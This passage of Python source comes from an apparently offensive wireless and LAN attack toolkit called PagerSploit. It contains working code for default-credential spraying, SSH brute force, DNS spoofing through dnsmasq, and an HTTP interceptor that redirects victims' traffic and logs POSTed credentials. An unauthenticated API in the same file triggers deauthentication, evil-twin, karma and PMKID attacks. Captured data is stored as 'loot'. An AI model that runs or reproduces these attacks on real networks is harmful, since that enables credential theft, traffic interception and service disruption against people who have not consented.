                            _register_loot(dst, 'handshakes')
                        except Exception: pass
                seen = current
            except: pass
            stop.wait(5)
        _pineapple('PINEAPPLE_EXAMINE_RESET')
        _pineapple('PINEAPPLE_HOPPING_START')
        log('PMKID done', 'info')
        set_module('idle', 'PMKID done'); unreg_stop('pmkid')
    start_job('pmkid', _run)
    return stop


# ── LAN ───────────────────────────────────────────────────────────────────
def lan_arp_scan(subnet='172.16.52.0/24'):
    log(f'ARP scan: {subnet}','info'); set_module('ARP Scan',subnet)
    subnets = [subnet]
    # Only add evil-twin subnet (10.0.0.x) if br-evil interface actually exists
    if not any('10.0.0' in s for s in subnets):
        r = subprocess.run(['ip','link','show','br-evil'], capture_output=True)
        if r.returncode == 0:
            subnets.append('10.0.0.0/24')
    hosts = []
    seen_ips = set()
    for sn in subnets:
        out = run_cmd([nmap_bin(), '-sn', sn], timeout=90)
        for line in out.splitlines():
            if 'Nmap scan report' in line:
                ip = line.split()[-1].strip('()')
                if ip not in seen_ips:
                    seen_ips.add(ip)
                    hosts.append({'ip': ip, 'mac': '', 'vendor': '', 'hostname': ''})
            elif 'MAC Address' in line and hosts:
                parts = line.split('MAC Address:')[1].strip().split(' ', 1)
                hosts[-1]['mac'] = parts[0]
                if len(parts) > 1: hosts[-1]['vendor'] = parts[1].strip('()')
    with STATE_LOCK: STATE['hosts'] = hosts
    if hosts: save_loot('scans', f'arp_{ts()}.json', json.dumps(hosts, indent=2))
    log(f'ARP: {len(hosts)} hosts', 'success'); set_module('idle', f'{len(hosts)} hosts')
    return hosts

def lan_port_scan(target, ports='1-1024'):
    log(f'Port scan: {target}','info'); set_module('Port Scan',target)
    out=run_cmd([nmap_bin(),'-p',ports,'--open','-sV','--host-timeout','120s',target],timeout=180)
    results=[{'port':p.split()[0],'state':p.split()[1],'service':' '.join(p.split()[2:])} for p in out.splitlines() if '/tcp' in p and 'open' in p]
    out_file=save_loot('scans',f'portscan_{target}_{ts()}.txt',out)
    set_data('last_portscan',{'target':target,'results':results,'raw':out,'file':out_file})
    log(f'Port scan {target}: {len(results)} open','success'); set_module('idle',f'{len(results)} ports open')
    return results, out

def lan_service_scan(target):
    log(f'Service scan: {target}','info'); set_module('Service Scan',target)
    out=run_cmd([nmap_bin(),'-sV','-sC','-p-','--open','--host-timeout','300s',target],timeout=360)
    save_loot('scans',f'service_{target}_{ts()}.txt',out)
    set_data('last_servicescan',{'target':target,'raw':out})
    log(f'Service scan done: {target}','success'); set_module('idle','Service scan done')
    return out

def lan_os_detect(target):
    log(f'OS detect: {target}','info'); set_module('OS Detect',target)
    out=run_cmd([nmap_bin(),'-O','--osscan-guess',target],timeout=120)
    result={'target':target,'raw':out,'os':''}
    for line in out.splitlines():
        if 'OS details' in line or 'Running:' in line:
            result['os']=line.split(':',1)[1].strip() if ':' in line else line
    set_data('os_detect',result)
    save_loot('scans',f'os_{target}_{ts()}.txt',out)
    log(f'OS detect done: {target}','success'); set_module('idle',result['os'][:30] or 'Done')
    return result

def lan_banner_grab(target):
    ports=[21,22,23,25,80,110,143,443,3306,5432,6379,8080,8443]
    log(f'Banner grab: {target}','info'); set_module('Banner Grab',target)
    results=[]
    for port in ports:
        try:
            s=socket.socket(); s.settimeout(3); s.connect((target,port))
            try:
                if port in [80,8080]: s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner=s.recv(256).decode('utf-8',errors='replace').strip()[:200]
            except: banner=''
            s.close()
            if banner: results.append({'port':port,'banner':banner})
        except: pass
    set_data('banners',results)
    if results: save_loot('scans',f'banners_{target}_{ts()}.json',json.dumps(results,indent=2))
    log(f'Banners {target}: {len(results)}','success'); set_module('idle',f'{len(results)} banners')
    return results

def lan_ping_sweep(subnet):
    log(f'Ping sweep: {subnet}','info'); set_module('Ping Sweep',subnet)
    out=run_cmd([nmap_bin(),'-sn',subnet],timeout=60)
    hosts=[line.split()[-1].strip('()') for line in out.splitlines() if 'report for' in line]
    set_data('ping_sweep',hosts)
    save_loot('scans',f'ping_{ts()}.txt','\n'.join(hosts))
    log(f'Ping sweep: {len(hosts)} up','success'); set_module('idle',f'{len(hosts)} up')
    return hosts

def lan_default_creds(target):
    CREDS=[('admin','admin'),('admin','password'),('admin','1234'),('admin','12345'),('admin',''),
           ('root','root'),('root','toor'),('root',''),('user','user'),('admin','admin123'),
           ('guest','guest'),('pi','raspberry'),('ubnt','ubnt'),('cisco','cisco')]
    results=[]; log(f'Cred spray: {target}','warn'); set_module('Cred Spray',target)
    for user,pwd in CREDS:
        try:
            req=urllib.request.Request(f'http://{target}/')
            req.add_header('Authorization','Basic '+base64.b64encode(f'{user}:{pwd}'.encode()).decode())
            resp=urllib.request.urlopen(req,timeout=3)
            if resp.status==200:
                results.append({'service':'http-basic','user':user,'pass':pwd})
                log(f'HTTP CREDS: {user}:{pwd}','success')
        except: pass
    for user,pwd in CREDS[:6]:
        for path in ['/','/login','/admin','/cgi-bin/login.cgi']:
            try:
                data=urllib.parse.urlencode({'username':user,'password':pwd}).encode()
                resp=urllib.request.urlopen(urllib.request.Request(f'http://{target}{path}',data=data),timeout=3)
                body=resp.read(1024).decode('utf-8',errors='replace')
                if any(k in body.lower() for k in ['logout','dashboard','welcome']):
                    results.append({'service':f'form{path}','user':user,'pass':pwd})
                    log(f'FORM CREDS: {path} {user}:{pwd}','success')
            except: pass
    if results: save_loot('credentials',f'creds_{target}_{ts()}.json',json.dumps(results,indent=2))
    set_module('idle',f'{len(results)} found'); return results

def lan_ssh_brute(target, port=22):
    log(f'SSH brute: {target}:{port}','warn'); set_module('SSH Brute',f'{target}:{port}')
    creds=[]; banner=''
    out=run_cmd([nmap_bin(),'-p',str(port),'--script','ssh-brute',target],timeout=120)
    for line in out.splitlines():
        if 'Valid credentials' in line or 'successful' in line.lower():
            creds.append({'service':'ssh','raw':line}); log(f'SSH: {line}','success')
    # Grab banner separately — save to scans, not credentials
    try:
        s=socket.socket(); s.settimeout(3); s.connect((target,port))
        banner=s.recv(256).decode('utf-8',errors='replace').strip()[:100]; s.close()
    except: pass
    if creds:
        save_loot('credentials',f'ssh_{target}_{ts()}.json',json.dumps(creds,indent=2))
    # Save full nmap output (with banner) to scans regardless
    scan_out = out + (f'\n\nBanner: {banner}' if banner else '')
    save_loot('scans',f'ssh_scan_{target}_{ts()}.txt', scan_out)
    set_data('ssh_scan',{'target':target,'raw':scan_out,'creds':creds,'banner':banner})
    results = creds if creds else ([{'service':'ssh','banner':banner}] if banner else [])
    set_module('idle',f'{len(creds)} creds found'); return results

def lan_smb_enum(target):
    log(f'SMB enum: {target}','info'); set_module('SMB Enum',target)
    out=run_cmd([nmap_bin(),'-p','445,139','--script','smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode',target],timeout=120)
    save_loot('scans',f'smb_{target}_{ts()}.txt',out)
    set_data('smb_enum',{'target':target,'raw':out})
    log(f'SMB done: {target}','success'); set_module('idle','SMB done'); return out

def lan_snmp_walk(target, community='public'):
    log(f'SNMP: {target}','info'); set_module('SNMP Walk',target)
    snmpwalk=subprocess.run(['which','snmpwalk'],capture_output=True,text=True).stdout.strip()
    out=run_cmd([snmpwalk,'-v2c','-c',community,target],timeout=60) if snmpwalk else \
        run_cmd([nmap_bin(),'-sU','-p','161','--script','snmp-info,snmp-sysdescr',f'--script-args=snmpcommunity={community}',target],timeout=90)
    save_loot('scans',f'snmp_{target}_{ts()}.txt',out)
    set_data('snmp_out',out)
    log(f'SNMP done: {target}','success'); set_module('idle','SNMP done'); return out

def lan_ssl_cert(target, port=443):
    log(f'SSL cert: {target}:{port}','info'); set_module('SSL Cert',f'{target}:{port}')
    out=run_cmd([nmap_bin(),'-p',str(port),'--script','ssl-cert,ssl-enum-ciphers',target],timeout=60)
    result={'target':target,'port':port,'raw':out,'subject':'','issuer':'','expiry':''}
    for line in out.splitlines():
        if 'Subject:' in line: result['subject']=line.split('Subject:',1)[1].strip()
        if 'Issuer:' in line: result['issuer']=line.split('Issuer:',1)[1].strip()
        if 'Not valid after' in line: result['expiry']=line.split(':',1)[1].strip()
    set_data('ssl_cert',result)
    save_loot('scans',f'ssl_{target}_{ts()}.txt',out)
    log(f'SSL done: {target}','success'); set_module('idle','SSL done'); return result

def lan_mdns_discover():
    log('mDNS/SSDP discovery','info'); set_module('mDNS','Listening...')
    devices=[]
    ssdp='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
        sock.settimeout(5); sock.sendto(ssdp.encode(),('239.255.255.250',1900))
        while True:
            try:
                data,addr=sock.recvfrom(2048)
                info=data.decode('utf-8',errors='replace')
                server=next((l.split(':',1)[1].strip() for l in info.splitlines() if l.lower().startswith('server:')),'')
                devices.append({'ip':addr[0],'protocol':'SSDP','server':server})
            except socket.timeout: break
        sock.close()
    except Exception as e: log(f'SSDP: {e}','error')
    set_data('mdns_devices',devices)
    if devices: save_loot('scans',f'mdns_{ts()}.json',json.dumps(devices,indent=2))
    log(f'mDNS: {len(devices)} devices','success'); set_module('idle',f'{len(devices)} devices')
    return devices

def lan_dns_spoof(domain, redirect_ip):
    log(f'DNS spoof: {domain} -> {redirect_ip}','warn')
    # Write to dnsmasq.d so it's auto-included, then HUP to reload
    conf_dir = '/etc/dnsmasq.d'
    os.makedirs(conf_dir, exist_ok=True)
    conf_file = f'{conf_dir}/ps_spoof.conf'
    # Append or create
    with open(conf_file, 'a') as f: f.write(f'address=/{domain}/{redirect_ip}\n')
    # Also keep legacy tmp file as fallback
    with open('/tmp/ps_dns_spoof.conf','a') as f: f.write(f'address=/{domain}/{redirect_ip}\n')
    subprocess.run(['killall','-HUP','dnsmasq'],stderr=subprocess.DEVNULL)
    subprocess.run(['killall','-HUP','dnsmasq.hak5'],stderr=subprocess.DEVNULL)
    log(f'DNS spoof active: {domain}','success'); return True

def lan_http_intercept(iface='wlan0'):
    stop=make_stop(); reg_stop('http_intercept',stop)
    ilog=loot_path('credentials',f'http_{ts()}.log')
    os.makedirs(loot_path('credentials'),exist_ok=True)
    log('HTTP intercept started','warn'); set_module('HTTP Intercept','Active')
    subprocess.run(['sysctl','-w','net.ipv4.ip_forward=1'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','table','ip','ps_intercept'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','chain','ip','ps_intercept','prerouting','{','type','nat','hook','prerouting','priority','-100',';','}'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','rule','ip','ps_intercept','prerouting','iif','br-evil','tcp','dport','80','redirect','to',':8181'],stderr=subprocess.DEVNULL)
    class _H(BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _rec(self,method,body=''):
            entry=f'[{datetime.now().strftime("%H:%M:%S")}] {method} {self.headers.get("Host","")}{self.path} from {self.client_address[0]} | {body[:300]}\n'
            with open(ilog,'a') as f: f.write(entry)
            log(entry.strip()[:80],'info' if method=='GET' else 'success')
            if method=='POST':
                _register_loot(ilog, 'credentials')
        def do_GET(self):
            self._rec('GET'); self.send_response(200); self.end_headers()
            self.wfile.write(b'<html><body>Loading...</body></html>')
        def do_POST(self):
            body=self.rfile.read(int(self.headers.get('Content-Length',0))).decode('utf-8',errors='replace')
            self._rec('POST',body); self.send_response(302); self.send_header('Location','/'); self.end_headers()
    server=HTTPServer(('0.0.0.0',8181),_H)
    server.timeout = 1.0  # handle_request returns after 1s if no request, allowing stop check
    def _run():
        while not stop.is_set(): server.handle_request()
        subprocess.run(['nft','delete','table','ip','ps_intercept'],stderr=subprocess.DEVNULL)
        log('HTTP intercept stopped','info'); set_module('idle','Intercept stopped'); unreg_stop('http_intercept')
    start_job('http_intercept',_run); return stop

# ── OSINT ─────────────────────────────────────────────────────────────────
def osint_mac_lookup(mac):
    log(f'MAC lookup: {mac}','info'); set_module('MAC Lookup',mac)
    mac_clean=mac.upper().replace(':','').replace('-','')[:6]
    # wireshark/manuf uses "AA:BB:CC" colon format; nmap uses "AABBCC" no-colon format
    mac_colon=':'.join(mac_clean[i:i+2] for i in range(0,6,2))
    vendor=''
    for path in ['/usr/share/nmap/nmap-mac-prefixes','/usr/share/wireshark/manuf',
                 '/mmc/usr/share/nmap/nmap-mac-prefixes']:
        if os.path.exists(path):
            try:
                with open(path,'r',errors='replace') as f:
                    for line in f:
                        lu=line.upper().lstrip()
                        if lu.startswith(mac_clean) or lu.startswith(mac_colon):
                            parts=line.split()
                            vendor=' '.join(parts[1:]).strip() if len(parts)>1 else ''
                            # wireshark format has 3 tab-separated fields; take second
                            if '\t' in line:
                                tabs=line.split('\t')
                                vendor=tabs[1].strip() if len(tabs)>1 else vendor
                            break
            except: pass
        if vendor: break
    result={'mac':mac,'vendor':vendor or 'Unknown'}
    set_data('mac_lookup',result)
    log(f'MAC {mac}: {result["vendor"]}','success'); set_module('idle',result['vendor'])
    return result

def osint_ip_geo(ip):
    log(f'IP geo: {ip}','info'); set_module('IP Geo',ip)
    result={'ip':ip}
    try:
        req=urllib.request.Request(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,query',headers={'User-Agent':'PagerSploit'})
        data=json.loads(urllib.request.urlopen(req,timeout=8).read(1024).decode())
        result.update(data)
        log(f'IP {ip}: {data.get("city","?")} {data.get("country","?")} / {data.get("isp","?")}','success')
    except Exception as e: log(f'IP geo: {e}','error')
    set_data('ip_geo',result); set_module('idle',f'{result.get("city","?")} {result.get("country","")}')
    return result

def osint_whois(target):
    log(f'WHOIS: {target}','info'); set_module('WHOIS',target)
    out=run_cmd(['whois',target],timeout=15)
    if not out or 'not found' in out.lower():
        try:
            s=socket.socket(); s.settimeout(10); s.connect(('whois.iana.org',43))
            s.send((target+'\r\n').encode()); buf=b''
            while True:
                chunk=s.recv(4096)
                if not chunk: break
                buf+=chunk
            s.close(); out=buf.decode('utf-8',errors='replace')
        except Exception as e: out=f'WHOIS error: {e}'
    save_loot('scans',f'whois_{target}_{ts()}.txt',out)
    set_data('whois',{'target':target,'raw':out})
    log(f'WHOIS done: {target}','success'); set_module('idle','WHOIS done'); return out

def osint_dns_enum(domain):
    log(f'DNS enum: {domain}','info'); set_module('DNS Enum',domain)
    results={}
    for rtype in ['A','AAAA','MX','NS','TXT','CNAME','SOA']:
        out=run_cmd(['dig','+short','-t',rtype,domain],timeout=10)
        if not out or 'command not found' in out:
            out=run_cmd(['nslookup','-type='+rtype,domain],timeout=10)
        results[rtype]=[l.strip() for l in out.splitlines() if l.strip() and not l.startswith(';')]
    ns_out=run_cmd(['dig','+short','NS',domain],timeout=10)
    for ns in ns_out.splitlines():
        ns=ns.strip().rstrip('.')
        if ns:
            axfr=run_cmd(['dig','AXFR',domain,f'@{ns}'],timeout=15)
            if 'XFR size' in axfr or 'Transfer' in axfr:
                results['AXFR']=axfr; log(f'ZONE TRANSFER: {domain}','success')
                with STATE_LOCK: STATE['loot_count']+=1
    save_loot('scans',f'dns_{domain}_{ts()}.json',json.dumps(results,indent=2))
    set_data('dns_enum',{'domain':domain,'records':results})
    log(f'DNS enum done: {domain}','success'); set_module('idle','DNS enum done'); return results

def osint_dns_bruteforce(domain, wordlist=None):
    log(f'DNS brute: {domain}','info'); set_module('DNS Brute',domain)
    if wordlist:
        try:
            with open(wordlist) as f: subs=[l.strip() for l in f if l.strip()][:500]
        except: subs=[]
    else:
        subs=['www','mail','ftp','admin','vpn','api','dev','test','staging','smtp','pop','imap',
              'ns1','ns2','mx','remote','portal','dashboard','app','shop','cdn','static','login',
              'secure','m','mobile','beta','git','jenkins','jira','confluence','gitlab','wiki']
    found=[]
    for sub in subs:
        fqdn=f'{sub}.{domain}'
        try:
            ip=socket.gethostbyname(fqdn)
            found.append({'subdomain':fqdn,'ip':ip}); log(f'Found: {fqdn} -> {ip}','success')
        except: pass
    save_loot('scans',f'dnsbrute_{domain}_{ts()}.json',json.dumps(found,indent=2))
    if found:
        with STATE_LOCK: STATE['loot_count']+=1
    set_data('dns_brute',found)
    log(f'DNS brute {domain}: {len(found)} found','success'); set_module('idle',f'{len(found)} subdomains')
    return found

def osint_wifi_geolocate(bssids):
    log(f'WiFi geo: {len(bssids)} BSSIDs','info'); set_module('WiFi Geo',f'{len(bssids)} APs')
    payload=json.dumps({'wifiAccessPoints':[{'macAddress':b} for b in bssids[:10]]}).encode()
    result={'bssids':bssids}
    try:
        req=urllib.request.Request('https://location.services.mozilla.com/v1/geolocate?key=geoclue',
            data=payload,headers={'Content-Type':'application/json','User-Agent':'PagerSploit'})
        data=json.loads(urllib.request.urlopen(req,timeout=10).read(512).decode())
        result.update(data)
        loc=data.get('location',{})
        log(f'WiFi geo: {loc.get("lat","?")} {loc.get("lng","?")} acc={data.get("accuracy","?")}m','success')
    except Exception as e: result['error']=str(e); log(f'WiFi geo: {e}','error')
    set_data('wifi_geo',result); set_module('idle','Geo done'); return result

def osint_http_fingerprint(target, port=80):
    log(f'HTTP fp: {target}:{port}','info'); set_module('HTTP Scan',f'{target}:{port}')
    proto='https' if port in [443,8443] else 'http'
    result={'target':target,'port':port,'headers':{},'tech':[]}
    try:
        req=urllib.request.Request(f'{proto}://{target}:{port}/',headers={'User-Agent':'Mozilla/5.0'})
        resp=urllib.request.urlopen(req,timeout=8)
        result['status']=resp.status; result['headers']=dict(resp.headers)
        body=resp.read(4096).decode('utf-8',errors='replace')
        h=str(result['headers']).lower()
        for tech,sig in [('WordPress','wp-content'),('Joomla','Joomla'),('Drupal','Drupal'),
                ('phpMyAdmin','phpMyAdmin'),('Jenkins','Jenkins'),('cPanel','cPanel'),
                ('Apache','Apache'),('nginx','nginx'),('IIS','Microsoft-IIS'),
                ('PHP','PHP'),('ASP.NET','ASP.NET'),('jQuery','jquery')]:
            if sig.lower() in body.lower() or sig.lower() in h: result['tech'].append(tech)
        log(f'HTTP {target}: {resp.status} tech={result["tech"]}','success')
    except Exception as e: result['error']=str(e); log(f'HTTP fp: {e}','error')
    set_data('http_headers',result)
    save_loot('scans',f'http_{target}_{ts()}.json',json.dumps(result,indent=2))
    set_module('idle','HTTP done'); return result

def osint_sysrecon():
    log('Sys recon...','info'); set_module('Sys Recon','Gathering...')
    result={}
    result['interfaces']=run_cmd(['ip','addr','show'],timeout=5)
    result['iwconfig']=run_cmd(['iwconfig'],timeout=5)
    result['br_lan_clients']=run_cmd(['arp','-n','-i','br-lan'],timeout=5)
    result['br_evil_clients']=run_cmd(['arp','-n','-i','br-evil'],timeout=5)
    result['routes']=run_cmd(['ip','route'],timeout=5)
    result['disk']=run_cmd(['df','-h'],timeout=5)
    result['processes']=run_cmd(['ps','aux'],timeout=5)
    result['nftables']=run_cmd(['nft','list','ruleset'],timeout=5)
    # DHCP leases — try all known locations on OpenWrt/Pager
    for lf in ['/tmp/dhcp.leases', '/var/lib/misc/dnsmasq.leases',
               '/mmc/tmp/dhcp.leases', '/tmp/dnsmasq.leases']:
        if os.path.exists(lf):
            try:
                with open(lf) as f: result['dhcp_leases'] = f.read(); break
            except: pass
    # Also grab ARP table (shows current connected clients)
    result['arp_table'] = run_cmd(['cat', '/proc/net/arp'], timeout=3)
    save_loot('scans',f'sysrecon_{ts()}.json',json.dumps(result,indent=2))
    set_data('sysrecon',result)
    log('Sys recon done','success'); set_module('idle','Recon done'); return result

# ── Loot / Wordlists ──────────────────────────────────────────────────────
def get_loot_list():
    with STATE_LOCK:
        loot = list(STATE['session_loot'])
    # Refresh size/mtime for files that are still being written (e.g. intercept logs)
    result = []
    seen = set()
    for entry in loot:
        path = entry['path']
        if path in seen or not os.path.exists(path): continue
        seen.add(path)
        try:
            st = os.stat(path)
            entry = dict(entry)
            entry['size'] = st.st_size
            entry['modified'] = datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')
        except: pass
        result.append(entry)
    result.sort(key=lambda x: x['modified'], reverse=True)
    return result

def get_wordlists():
    lists=[]
    seen=set()
    for d in [
        os.path.normpath(loot_path('..','wordlists')),
        '/root/loot/wordlists','/mmc/wordlists','/root/wordlists',
        '/mmc/root/wordlists','/mmc/usr/share/wordlists',
        '/usr/share/wordlists','/opt/wordlists',
    ]:
        if not os.path.isdir(d): continue
        for f in os.listdir(d):
            if f.endswith(('.txt','.lst','.gz','.dict')):
                path=os.path.join(d,f)
                if path in seen: continue
                seen.add(path)
                try: lists.append({'name':f,'path':path,'size':os.path.getsize(path)})
                except: pass
    lists.sort(key=lambda x: x['name'])
    return lists


# ── API Handler ───────────────────────────────────────────────────────────
class APIHandler(BaseHTTPRequestHandler):
    timeout = 10
    def log_message(self,*a): pass
    def send_json(self,data,code=200):
        body=json.dumps(data).encode()
        self.send_response(code)
        self.send_header('Content-Type','application/json')
        self.send_header('Content-Length',len(body))
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Connection','close')
        self.end_headers(); self.wfile.write(body)
    def send_html(self,html):
        body=html.encode() if isinstance(html,str) else html
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.send_header('Content-Length',len(body))
        self.send_header('Connection','close')
        self.end_headers(); self.wfile.write(body)
    def get_body(self):
        length=int(self.headers.get('Content-Length',0))
        if length:
            raw=self.rfile.read(length).decode('utf-8',errors='replace')
            try: return json.loads(raw)
            except: return {}
        return {}
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Access-Control-Allow-Methods','GET, POST, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers','Content-Type')
        self.end_headers()
    def do_GET(self):
        path=urlparse(self.path).path
        if path=='/api/ping':
            self.send_json({'pong': True, 'module': STATE['active_module']}); return
        if path in ('/','index.html'): self.send_html(get_ui_html()); return
        if path == '/pagersploit.js':
            js_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'pagersploit.js')
            try:
                with open(js_path, 'rb') as f: body = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'application/javascript')
                self.send_header('Content-Length', len(body))
                self.send_header('Connection', 'close')
                self.end_headers(); self.wfile.write(body)
            except Exception as e: self.send_json({'error': str(e)}, 500)
            return
        if path=='/api/state':
            with STATE_LOCK:
                s={k:v for k,v in STATE.items() if k not in ('module_data',)}
                s['jobs']=list(STATE['jobs'].keys())
                s['stop_events']=list(STATE['stop_events'].keys())
            self.send_json(s); return
        if path=='/api/log':
            with STATE_LOCK: self.send_json(list(STATE['log'][-150:]))
            return
        if path=='/api/scans':
            with STATE_LOCK: self.send_json(list(STATE['scan_results']))
            return
        if path=='/api/hosts':
            with STATE_LOCK: self.send_json(list(STATE['hosts']))
            return
        if path=='/api/loot': self.send_json(get_loot_list()); return
        if path=='/api/wordlists': self.send_json(get_wordlists()); return
        if path=='/api/portals':
            d=os.path.join(get_payload_dir(),'portals')
            self.send_json([f for f in os.listdir(d) if f.endswith('.html')] if os.path.isdir(d) else [])
            return
        if path.startswith('/api/data/'):
            self.send_json(get_data(path[len('/api/data/'):],{})); return
        if path.startswith('/api/loot/download/'):
            fname=unquote_plus(path[len('/api/loot/download/'):])
            item=next((l for l in get_loot_list() if l['name']==fname),None)
            if item and os.path.exists(item['path']):
                with open(item['path'],'rb') as f: data=f.read()
                self.send_response(200)
                self.send_header('Content-Disposition',f'attachment; filename="{fname}"')
                self.send_header('Content-Length',len(data))
                self.end_headers(); self.wfile.write(data)
            else: self.send_json({'error':'not found'},404)
            return
        self.send_json({'error':'not found'},404)

    def do_DELETE(self):
        path=urlparse(self.path).path
        if path.startswith('/api/loot/delete/'):
            fname=unquote_plus(path[len('/api/loot/delete/'):])
            # Match by name — pick most recently modified to avoid wrong-file deletion
            items=[l for l in get_loot_list() if l['name']==fname]
            item=items[0] if items else None
            if item and os.path.exists(item['path']):
                try:
                    os.remove(item['path'])
                    with STATE_LOCK: STATE['loot_count']=max(0,STATE['loot_count']-1)
                    log(f'Deleted loot: {item["path"]}','info')
                    self.send_json({'status':'deleted','name':fname})
                except Exception as e: self.send_json({'error':str(e)},500)
            else: self.send_json({'error':'not found'},404)
            return
        if path=='/api/loot/delete_all':
            deleted=0
            # Only delete files in our payload loot dir, not pineapd's /root/loot
            for item in get_loot_list():
                if not item['path'].startswith(loot_path()): continue
                try: os.remove(item['path']); deleted+=1
                except: pass
            with STATE_LOCK: STATE['loot_count']=0
            log(f'Deleted payload loot: {deleted} files','info')
            self.send_json({'status':'deleted','count':deleted})
            return
        self.send_json({'error':'not found'},404)

    def do_POST(self):
        path=urlparse(self.path).path
        b=self.get_body()
        def req(field,err='required'):
            v=b.get(field,'')
            if not v: self.send_json({'error':f'{field} {err}'},400); return None
            return v

        if path=='/api/wifi/scan':
            band=b.get('band','abg'); dur=int(b.get('duration',20))
            start_job('wifi_scan',wifi_scan,band,dur)
            self.send_json({'status':'scanning','band':band,'duration':dur})
        elif path=='/api/wifi/capture':
            bssid=b.get('bssid','')
            if bssid: _,hs_dir=wifi_capture(bssid,str(b.get('channel','6')),b.get('ssid','capture')); self.send_json({'status':'started','handshake_dir':hs_dir})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/wifi/crack':
            c,w=b.get('cap_file',''),b.get('wordlist','')
            if c and w: wifi_crack(c,w); self.send_json({'status':'started'})
            else: self.send_json({'error':'cap_file and wordlist required'},400)
        elif path=='/api/wifi/probe_harvest':
            wifi_probe_harvest(int(b.get('duration',60))); self.send_json({'status':'started'})
        elif path=='/api/wifi/beacon_flood':
            ssids=b.get('ssids',['Free WiFi'])
            if isinstance(ssids,str): ssids=[s.strip() for s in ssids.split('\n') if s.strip()]
            wifi_beacon_flood(ssids); self.send_json({'status':'started','count':len(ssids)})
        elif path=='/api/wifi/wps_scan':
            start_job('wps_scan',wifi_wps_scan); self.send_json({'status':'scanning'})
        elif path=='/api/wifi/karma':
            wifi_karma(str(b.get('channel','6')),b.get('ssids',[])); self.send_json({'status':'started'})
        elif path=='/api/wifi/auth_flood':
            bssid=b.get('bssid','')
            if bssid: wifi_auth_flood(bssid,str(b.get('channel','6'))); self.send_json({'status':'started'})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/wifi/evil_twin':
            ssid=b.get('ssid',''); portal=b.get('portal')
            if portal: portal=os.path.join(get_payload_dir(),'portals',portal)
            if ssid: wifi_evil_twin(ssid,str(b.get('channel','6')),portal); self.send_json({'status':'started'})
            else: self.send_json({'error':'ssid required'},400)
        elif path=='/api/wifi/deauth':
            bssid=b.get('bssid','')
            if bssid: wifi_deauth(bssid,str(b.get('channel','6')),str(b.get('count','0')),b.get('client','FF:FF:FF:FF:FF:FF')); self.send_json({'status':'started'})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/wifi/channel_hop':
            wifi_channel_hop(str(b.get('band','2'))); self.send_json({'status':'started'})
        elif path=='/api/wifi/pmkid':
            bssid=b.get('bssid','')
            if bssid: wifi_pmkid(bssid,str(b.get('channel','6'))); self.send_json({'status':'started'})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/lan/arp_scan':
            start_job('arp_scan',lan_arp_scan,b.get('subnet','172.16.52.0/24')); self.send_json({'status':'started'})
        elif path=='/api/lan/port_scan':
            t=b.get('target','')
            if t: start_job('port_scan',lan_port_scan,t,b.get('ports','1-1024')); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/service_scan':
            t=b.get('target','')
            if t: start_job('service_scan',lan_service_scan,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/os_detect':
            t=b.get('target','')
            if t: start_job('os_detect',lan_os_detect,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/banner_grab':
            t=b.get('target','')
            if t: start_job('banner_grab',lan_banner_grab,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ping_sweep':
            start_job('ping_sweep',lan_ping_sweep,b.get('subnet','172.16.52.0/24')); self.send_json({'status':'started'})
        elif path=='/api/lan/default_creds':
            t=b.get('target','')
            if t: start_job('default_creds',lan_default_creds,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ssh_brute':
            t=b.get('target','')
            if t: start_job('ssh_brute',lan_ssh_brute,t,int(b.get('port',22))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/smb_enum':
            t=b.get('target','')
            if t: start_job('smb_enum',lan_smb_enum,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/snmp_walk':
            t=b.get('target','')
            if t: start_job('snmp_walk',lan_snmp_walk,t,b.get('community','public')); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ssl_cert':
            t=b.get('target','')
            if t: start_job('ssl_cert',lan_ssl_cert,t,int(b.get('port',443))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/mdns':
            start_job('mdns',lan_mdns_discover); self.send_json({'status':'started'})
        elif path=='/api/lan/dns_spoof':
            d,r=b.get('domain',''),b.get('redirect','')
            if d and r: lan_dns_spoof(d,r); self.send_json({'status':'active','domain':d})
            else: self.send_json({'error':'domain and redirect required'},400)
        elif path=='/api/lan/http_intercept':
            lan_http_intercept(b.get('iface','wlan0')); self.send_json({'status':'started'})
        elif path=='/api/osint/mac':
            m=b.get('mac','')
            if m: start_job('mac_lookup',osint_mac_lookup,m); self.send_json({'status':'started'})
            else: self.send_json({'error':'mac required'},400)
        elif path=='/api/osint/ipgeo':
            ip=b.get('ip','')
            if ip: start_job('ipgeo',osint_ip_geo,ip); self.send_json({'status':'started'})
